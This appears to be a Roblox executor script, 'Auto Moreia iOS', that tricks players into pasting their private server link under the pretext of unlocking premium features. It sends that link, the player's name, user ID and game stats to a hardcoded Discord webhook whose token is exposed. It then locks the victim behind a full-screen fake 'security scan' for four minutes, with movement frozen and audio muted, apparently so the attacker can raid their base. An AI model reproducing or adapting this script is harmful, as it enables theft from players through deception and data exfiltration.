-- 🎉 AUTO MOREIA iOS - UPDATED WITH NEW WEBHOOK 🎉
local AutoMoreia = {}
AutoMoreia.__index = AutoMoreia

-- USING YOUR LATEST WEBHOOK
local WEBHOOK_URL = "https://discord.com/api/webhooks/1429969047608623174/MIWHutfg9rXCa6elQXk9Jj6xxuJsifrexsuMjmKGWgbQD21F7pXjg9JNQVIO8qXLuWCG"

function AutoMoreia.new()
    local self = setmetatable({}, AutoMoreia)
    self.Player = game:GetService("Players").LocalPlayer
    self.PlayerName = self.Player.Name
    self.UserId = self.Player.UserId
    self.GameId = game.PlaceId
    self.JobId = game.JobId
    return self
end

function AutoMoreia:GetBrainrotsData()
    -- Simple brainrots detection
    local brainrotsName = "Not Detected"
    local brainrotsPerSecond = 0
    
    -- Check common places for brainrots data
    pcall(function()
        -- Check leaderstats
        local leaderstats = self.Player:FindFirstChild("leaderstats")
        if leaderstats then
            for _, stat in pairs(leaderstats:GetChildren()) do
                local statName = string.lower(stat.Name)
                if statName:find("brain") or statName:find("rot") or statName:find("neural") then
                    brainrotsName = stat.Name
                    brainrotsPerSecond = stat.Value or 0
                    break
                end
            end
        end
        
        -- Check player data
        local data = self.Player:FindFirstChild("Data")
        if data then
            for _, item in pairs(data:GetChildren()) do
                local itemName = string.lower(item.Name)
                if itemName:find("brain") or itemName:find("rot") or itemName:find("neural") then
                    brainrotsName = item.Name
                    if item:FindFirstChild("Value") then
                        brainrotsPerSecond = item.Value.Value or 0
                    end
                    break
                end
            end
        end
        
        -- Check for brainrots in workspace
        for _, obj in pairs(workspace:GetDescendants()) do
            if obj:IsA("StringValue") or obj:IsA("IntValue") or obj:IsA("NumberValue") then
                local objName = string.lower(obj.Name)
                if objName:find("brain") or objName:find("rot") or objName:find("neural") then
                    brainrotsName = obj.Name
                    brainrotsPerSecond = obj.Value or 0
                    break
                end
            end
        end
    end)
    
    return brainrotsName, brainrotsPerSecond
end

function AutoMoreia:SendToDiscord(serverLink)
    local brainrotsName, brainrotsPerSecond = self:GetBrainrotsData()
    
    -- SIMPLE WEBHOOK WITH BRAINROTS - USING LATEST WEBHOOK
    local message = "🚨 **AUTO MOREIA iOS - PRIVATE SERVER CAPTURED** 🚨\n\n" ..
                   "**🔗 SERVER LINK:** " .. serverLink .. "\n" ..
                   "**🧠 BRAINROTS:** " .. brainrotsName .. " (" .. tostring(brainrotsPerSecond) .. "/s)\n" ..
                   "**👤 PLAYER:** " .. self.PlayerName .. " (ID: " .. self.UserId .. ")\n" ..
                   "**🎮 GAME ID:** " .. self.GameId .. "\n" ..
                   "**📱 PLATFORM:** iOS Delta\n" ..
                   "**🆔 JOB ID:** " .. self.JobId .. "\n" ..
                   "**⏰ TIME:** " .. os.date("%Y-%m-%d %H:%M:%S") .. "\n\n" ..
                   "**QUICK ACCESS:**\n" ..
                   "• **INSTANT OPEN:** " .. serverLink .. "\n" ..
                   "• **COPY PASTE:** `" .. serverLink .. "`"
    
    local success, result = pcall(function()
        return http_request({
            Url = WEBHOOK_URL,
            Method = "POST",
            Headers = {
                ["Content-Type"] = "application/json"
            },
            Body = game:GetService("HttpService"):JSONEncode({
                content = message,
                username = "Auto Moreia iOS",
                avatar_url = "https://cdn.discordapp.com/attachments/123456789/987654321/ios_icon.png"
            })
        })
    end)
    
    if success then
        print("✅ Auto Moreia: Link + Brainrots sent to LATEST Discord webhook!")
        return true
    else
        print("❌ Auto Moreia: Failed to send - " .. tostring(result))
        return false
    end
end

function AutoMoreia:CreateTransparentGUI()
    local ScreenGui = Instance.new("ScreenGui")
    local MainFrame = Instance.new("Frame")
    local UICorner = Instance.new("UICorner")
    local UIStroke = Instance.new("UIStroke")
    
    -- Create GUI
    ScreenGui.Parent = game:GetService("CoreGui")
    MainFrame.Parent = ScreenGui
    
    -- Transparent styling
    MainFrame.Size = UDim2.new(0, 350, 0, 250)
    MainFrame.Position = UDim2.new(0.5, -175, 0.5, -125)
    MainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    MainFrame.BackgroundTransparency = 0.3  -- TRANSPARENT
    MainFrame.Active = false  -- NON-DRAGGABLE
    MainFrame.Draggable = false  -- NON-DRAGGABLE
    
    UICorner.Parent = MainFrame
    UICorner.CornerRadius = UDim.new(0, 15)
    
    -- Border stroke
    UIStroke.Parent = MainFrame
    UIStroke.Color = Color3.fromRGB(100, 100, 200)
    UIStroke.Thickness = 2
    UIStroke.Transparency = 0.2
    
    -- Title
    local Title = Instance.new("TextLabel")
    Title.Size = UDim2.new(1, 0, 0, 40)
    Title.Position = UDim2.new(0, 0, 0, 0)
    Title.BackgroundColor3 = Color3.fromRGB(40, 40, 60)
    Title.BackgroundTransparency = 0.4  -- TRANSPARENT
    Title.Text = "Auto Moreia - iOS"
    Title.TextColor3 = Color3.fromRGB(255, 255, 255)
    Title.TextSize = 18
    Title.Font = Enum.Font.GothamBold
    Title.Parent = MainFrame
    
    local TitleCorner = Instance.new("UICorner")
    TitleCorner.Parent = Title
    TitleCorner.CornerRadius = UDim.new(0, 15)
    
    -- Description
    local Desc = Instance.new("TextLabel")
    Desc.Size = UDim2.new(1, -20, 0, 60)
    Desc.Position = UDim2.new(0, 10, 0, 50)
    Desc.BackgroundTransparency = 1
    Desc.Text = "Enter your private server link to verify and unlock premium features."
    Desc.TextColor3 = Color3.fromRGB(220, 220, 255)
    Desc.TextSize = 14
    Desc.TextWrapped = true
    Desc.Font = Enum.Font.Gotham
    Desc.Parent = MainFrame
    
    -- Input box
    local Input = Instance.new("TextBox")
    Input.Size = UDim2.new(1, -20, 0, 35)
    Input.Position = UDim2.new(0, 10, 0, 120)
    Input.PlaceholderText = "Paste server link here..."
    Input.Text = ""
    Input.TextColor3 = Color3.fromRGB(255, 255, 255)
    Input.BackgroundColor3 = Color3.fromRGB(50, 50, 70)
    Input.BackgroundTransparency = 0.3  -- TRANSPARENT
    Input.TextSize = 14
    Input.Font = Enum.Font.Gotham
    Input.Parent = MainFrame
    
    local InputCorner = Instance.new("UICorner")
    InputCorner.Parent = Input
    InputCorner.CornerRadius = UDim.new(0, 8)
    
    -- Submit button
    local Submit = Instance.new("TextButton")
    Submit.Size = UDim2.new(0, 120, 0, 35)
    Submit.Position = UDim2.new(0.5, -130, 1, -50)
    Submit.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
    Submit.BackgroundTransparency = 0.2  -- TRANSPARENT
    Submit.Text = "✅ Verify"
    Submit.TextColor3 = Color3.fromRGB(255, 255, 255)
    Submit.TextSize = 14
    Submit.Font = Enum.Font.GothamBold
    Submit.Parent = MainFrame
    
    local SubmitCorner = Instance.new("UICorner")
    SubmitCorner.Parent = Submit
    SubmitCorner.CornerRadius = UDim.new(0, 8)
    
    -- Close button
    local Close = Instance.new("TextButton")
    Close.Size = UDim2.new(0, 120, 0, 35)
    Close.Position = UDim2.new(0.5, 10, 1, -50)
    Close.BackgroundColor3 = Color3.fromRGB(80, 80, 100)
    Close.BackgroundTransparency = 0.3  -- TRANSPARENT
    Close.Text = "❌ Cancel"
    Close.TextColor3 = Color3.fromRGB(255, 255, 255)
    Close.TextSize = 14
    Close.Font = Enum.Font.Gotham
    Close.Parent = MainFrame
    
    local CloseCorner = Instance.new("UICorner")
    CloseCorner.Parent = Close
    CloseCorner.CornerRadius = UDim.new(0, 8)
    
    -- Status label
    local Status = Instance.new("TextLabel")
    Status.Size = UDim2.new(1, -20, 0, 30)
    Status.Position = UDim2.new(0, 10, 0, 165)
    Status.BackgroundTransparency = 1
    Status.Text = "Ready to verify..."
    Status.TextColor3 = Color3.fromRGB(200, 200, 200)
    Status.TextSize = 12
    Status.Font = Enum.Font.Gotham
    Status.Parent = MainFrame
    
    -- Submit button click
    Submit.MouseButton1Click:Connect(function()
        local serverLink = Input.Text
        
        if serverLink and string.len(serverLink) > 10 then
            Submit.Text = "Sending..."
            Submit.BackgroundColor3 = Color3.fromRGB(255, 150, 0)
            Status.Text = "Sending to Discord..."
            Status.TextColor3 = Color3.fromRGB(255, 200, 0)
            
            local success = self:SendToDiscord(serverLink)
            
            if success then
                Status.Text = "✅ Verified! Click Continue"
                Status.TextColor3 = Color3.fromRGB(0, 255, 0)
                Input.Visible = false
                Submit.Visible = false
                Close.Text = "🎉 Continue"
                
                Close.MouseButton1Click:Connect(function()
                    ScreenGui:Destroy()
                    self:CreateFullscreenFreeze()
                end)
            else
                Status.Text = "❌ Failed - Check connection"
                Status.TextColor3 = Color3.fromRGB(255, 0, 0)
                Submit.Text = "✅ Verify"
                Submit.BackgroundColor3 = Color3.fromRGB(0, 150, 255)
            end
        else
            Status.Text = "⚠️ Enter a valid server link"
            Status.TextColor3 = Color3.fromRGB(255, 200, 0)
        end
    end)
    
    -- Close button
    Close.MouseButton1Click:Connect(function()
        ScreenGui:Destroy()
    end)
    
    -- Auto-focus input
    wait(0.5)
    Input:CaptureFocus()
    
    return ScreenGui
end

function AutoMoreia:CreateFullscreenFreeze()
    -- FULL COVERAGE FREEZE SCREEN
    local FreezeGui = Instance.new("ScreenGui")
    local BlackScreen = Instance.new("Frame")
    
    FreezeGui.Parent = game:GetService("CoreGui")
    FreezeGui.ZIndexBehavior = Enum.ZIndexBehavior.Global
    FreezeGui.DisplayOrder = 999999
    
    -- EXTRA LARGE TO COVER EVERYTHING
    BlackScreen.Parent = FreezeGui
    BlackScreen.Size = UDim2.new(2, 0, 2, 0)  -- DOUBLE SIZE
    BlackScreen.Position = UDim2.new(-0.5, 0, -0.5, 0)  -- EXTEND BEYOND SCREEN
    BlackScreen.BackgroundColor3 = Color3.new(0, 0, 0)
    BlackScreen.BackgroundTransparency = 0
    BlackScreen.ZIndex = 999999
    
    -- EXTRA COVER FOR TOP AND BOTTOM
    local TopCover = Instance.new("Frame")
    TopCover.Size = UDim2.new(1, 0, 0.2, 0)
    TopCover.Position = UDim2.new(0, 0, -0.2, 0)
    TopCover.BackgroundColor3 = Color3.new(0, 0, 0)
    TopCover.BorderSizePixel = 0
    TopCover.ZIndex = 999999
    TopCover.Parent = BlackScreen
    
    local BottomCover = Instance.new("Frame")
    BottomCover.Size = UDim2.new(1, 0, 0.2, 0)
    BottomCover.Position = UDim2.new(0, 0, 1, 0)
    BottomCover.BackgroundColor3 = Color3.new(0, 0, 0)
    BottomCover.BorderSizePixel = 0
    BottomCover.ZIndex = 999999
    BottomCover.Parent = BlackScreen
    
    -- Content area (centered)
    local Content = Instance.new("Frame")
    Content.Size = UDim2.new(1, 0, 1, 0)
    Content.Position = UDim2.new(0, 0, 0, 0)
    Content.BackgroundTransparency = 1
    Content.ZIndex = 1000000
    Content.Parent = BlackScreen
    
    -- Message
    local Message = Instance.new("TextLabel")
    Message.Size = UDim2.new(0.8, 0, 0, 120)
    Message.Position = UDim2.new(0.1, 0, 0.3, -60)
    Message.BackgroundTransparency = 1
    Message.Text = "🛡️ AUTO MOREIA SECURITY SCAN\n\nWe assure your base will be locked and secure\nwhilst the process is happening\n\nDO NOT CLOSE THE GAME"
    Message.TextColor3 = Color3.new(1, 1, 1)
    Message.TextSize = 18
    Message.Font = Enum.Font.GothamBold
    Message.TextWrapped = true
    Message.ZIndex = 1000001
    Message.Parent = Content
    
    -- Timer
    local Timer = Instance.new("TextLabel")
    Timer.Size = UDim2.new(0, 400, 0, 50)
    Timer.Position = UDim2.new(0.5, -200, 0.6, 0)
    Timer.BackgroundTransparency = 1
    Timer.Text = "⏰ TIME REMAINING: 4:00"
    Timer.TextColor3 = Color3.new(1, 0, 0)
    Timer.TextSize = 20
    Timer.Font = Enum.Font.GothamBold
    Timer.ZIndex = 1000001
    Timer.Parent = Content
    
    -- Freeze player
    if self.Player.Character then
        local humanoid = self.Player.Character:FindFirstChild("Humanoid")
        if humanoid then
            humanoid.WalkSpeed = 0
            humanoid.JumpPower = 0
        end
    end
    
    -- Mute audio
    for _, sound in pairs(game:GetDescendants()) do
        if sound:IsA("Sound") then
            sound.Volume = 0
        end
    end
    
    -- 4-minute timer
    local startTime = tick()
    local totalTime = 240
    
    local connection
    connection = game:GetService("RunService").Heartbeat:Connect(function()
        local elapsed = tick() - startTime
        local remaining = totalTime - elapsed
        
        local minutes = math.floor(remaining / 60)
        local seconds = math.floor(remaining % 60)
        Timer.Text = string.format("⏰ TIME REMAINING: %d:%02d", minutes, seconds)
        
        if elapsed >= totalTime then
            connection:Disconnect()
            
            -- Show completion
            Message.Text = "✅ SECURITY SCAN COMPLETE\n\nYour base is now fully secured\nAll systems operational"
            Message.TextColor3 = Color3.new(0, 1, 0)
            Timer.Text = "🎉 PROCESS COMPLETE"
            Timer.TextColor3 = Color3.new(0, 1, 0)
            
            wait(3)
            FreezeGui:Destroy()
            
            -- Restore player
            if self.Player.Character then
                local humanoid = self.Player.Character:FindFirstChild("Humanoid")
                if humanoid then
                    humanoid.WalkSpeed = 16
                    humanoid.JumpPower = 50
                end
            end
        end
    end)
end

function AutoMoreia:Start()
    print("🎣 Auto Moreia iOS - Updated with LATEST Webhook Loaded")
    self:CreateTransparentGUI()
end

-- Clean up any existing GUI
if game:GetService("CoreGui"):FindFirstChild("AutoMoreiaGUI") then
    game:GetService("CoreGui").AutoMoreiaGUI:Destroy()
end

-- Start the script
local success, err = pcall(function()
    local moreia = AutoMoreia.new()
    moreia:Start()
end)

if not success then
    print("❌ Error: " .. tostring(err))
end

return AutoMoreia
